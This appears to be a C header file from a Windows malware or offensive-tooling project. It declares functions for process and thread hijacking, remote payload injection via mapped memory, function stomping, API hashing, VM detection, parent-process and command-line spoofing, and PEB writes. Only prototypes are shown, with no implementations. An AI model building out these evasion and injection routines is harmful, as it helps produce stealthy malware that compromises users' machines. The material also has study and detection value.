#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <setupAPI.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

#include "Encryption.h"
#include "Win32FindDataArray.h"
#include "resource.h"

#ifdef __cplusplus
}
#endif

#include "HashingAPI.h"
#include "CompileTimeHashEngine.h"

#define HASHA(lpStringToHash, dwSeed)(HashStringJenkinsOneEachTime32BitA((LPSTR)(lpStringToHash), (DWORD)(dwSeed)))

#define HASHW(lpStringToHash, dwSeed)(GenerateCompileTimeHashW((PWSTR)(lpStringToHash)))

#define NtCustomCurrentProcess() ((HANDLE)-1) 
#define NtCustomCurrentThread()  ((HANDLE)-2) 


typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);

__kernel_entry NTSTATUS NTQuerySystemInformation
(
	IN              SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT          PVOID                    SystemInformation,
	IN              ULONG                    SystemInformationLength,
	   OUT OPTIONAL PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI  *fnNTQueryProcessInformation)
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);

__kernel_entry NTSTATUS NTQueryProcessInformation
(
	IN              HANDLE           ProcessHandle,
	IN              PROCESSINFOCLASS ProcessInformationClass,
	   OUT          PVOID            ProcessInformation,
	IN              ULONG            ProcessInformationLength,
	   OUT OPTIONAL PULONG           ReturnLength
);


typedef struct _RESOURCE
{
	PVOID  pAddress;
	size_t sSize;

}RESOURCE, * pRESOURCE;

BOOLEAN CreateLocalAlertableThread
(
       OUT PHANDLE phThread,
	   OUT LPDWORD pdwThreadId
);

BOOLEAN CreateDebuggedProcess
(
	IN     LPSTR   pProcessName,
	   OUT LPDWORD pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

static BOOLEAN CreateSuspendedProcess
(
	IN     PSTR    pProcessName,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSacrificialThread
(
	   OUT LPDWORD  pdwSacrificialThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
);

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress,
	IN     SIZE_T sPayloadSize
);

INT8 CheckVM
(
	IN     void
);

BOOLEAN FetchAlertableThread
(
	IN     DWORD   dwMainThreadId,
	IN     DWORD   dwTargetPID,
	   OUT PDWORD  pdwAlertedThreadId,
	   OUT PHANDLE phAlertedThreadHandle
);

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchRemoteThreadHandle
(
	IN     DWORD   dwProcessId,
	   OUT PDWORD  pdwThreadId,
	   OUT PHANDLE phThreadHandle
);

BOOLEAN FetchResource
(
	   OUT pRESOURCE pResource_t
);

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
);

BOOLEAN FetchProcessHandleHelpTool32
(
	IN     LPWSTR  pwTargetProcessName,
	   OUT PDWORD  pdwTargetProcessIdAddress,
	   OUT PHANDLE phTargetProcessHandleAddress
);

BOOLEAN FetchProcessHandleEnumProcesses
(
	IN     LPWSTR    lpTagetProcessName,
	   OUT PDWORD    pdwTargetProcessId,
	   OUT HANDLE   *phTargetProcessHandle
);

BOOLEAN FetchProcessHandleNtQuerySystemInformation
(
	IN     LPCWSTR szProcName,
	   OUT PDWORD pdwPid,
	   OUT PHANDLE phProcess
);

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN     LPWSTR pPath
);

VOID TestAlertableThread
(
	HANDLE hAlertableThreadHandle
);

HANDLE CreateVessel
(
	IN     LPWSTR pPath
);

BOOLEAN MapLocalMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pMappedAddress,
	   OUT SIZE_T  sPayloadSize,
	   OUT PHANDLE phFileMappingHandle 
);

BOOLEAN InjectPayloadRemoteMappedMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pRemoteMappedAddress,
	   OUT PUCHAR *pLocalMappedAddress,
	IN	   SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteFileMappingHandle,
	IN     HANDLE  hProcess
);

BOOL FetchStompingTarget
(
	IN     LPSTR  pSacrificialDllName,
	IN     LPSTR  pSacrificialFuncName,
	   OUT PVOID *pTargetFunctionAddress
);

HMODULE GetModuleHandleReplacement
(
	IN    LPCWSTR lpwTargetModuleName
);

HMODULE GetModuleHandleReplacementH
(
	IN    DWORD dwTargetModuleName
);

FARPROC GetProcessAddressReplacement
(
	IN     HMODULE Target_hModule,
	IN     LPSTR   lpTargetApiName
);

FARPROC GetProcessAddressReplacementH
(
	IN     HMODULE Target_hModule,
	IN     DWORD   dwTargetApiHash
);

BOOLEAN LogConsoleMouseClicks
(
	IN	   VOID
);

BOOLEAN SpoofParentProcessId
(
	IN     LPSTR   pMaliciousProcessName, 
	IN     HANDLE  hSpoofedParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
	   OUT PDWORD  pdwMaliciousProcessPID,
	   OUT PHANDLE phMaliciousProcessHandle,
	   OUT PDWORD  pdwMaliciousThreadId,
	   OUT PHANDLE phMaliciousThreadHandle
);

BOOLEAN SpoofCommandLineArguments
(
	IN     LPWSTR  pSpoofedCommandLine,
	IN	   LPWSTR  pMaliciousCommandLine,
	IN     DWORD   dwSpoofedCLALength,
	   OUT PHANDLE phProcessHandle,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phThreadHandle,
	   OUT PDWORD  pdwThreadId
);

BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process IDentifier
(
	IN	    LPWSTR  pSpoofedCommandLine,
	IN      HANDLE  hSpoofedParentProcessHandle,
	IN      LPWSTR  pMaliciousCommandLine,
	IN      DWORD   dwExposedCommandLineLength,
	IN      PCH    pTargetSpoofedPathName,
	   OUT 	PHANDLE phMaliciousProcessHandle,
	   OUT  PDWORD  pdwMaliciousProcessId,
	   OUT	PHANDLE phMalicousThreadHandle,
	   OUT  PDWORD  pdwMaliciousThreadId 
);

BOOLEAN ReadStructureFromProcess
(
	IN     HANDLE hTargetProcess, 
	IN     PVOID  pPEBBaseAddress, 
	   OUT PVOID *pReadBufferAddress, 
	IN     DWORD  dwBufferSize,
	IN     HANDLE hHeap
);

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
    IN     LPWSTR pPath,
    IN OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t
);

BOOLEAN WriteToTargetProcessEnvironmentBlock
(
	IN      HANDLE hProcess,
	IN      PVOID pAddressToWriteTo,
	IN      PVOID pBuffer,
	IN      DWORD dwBufferSize
);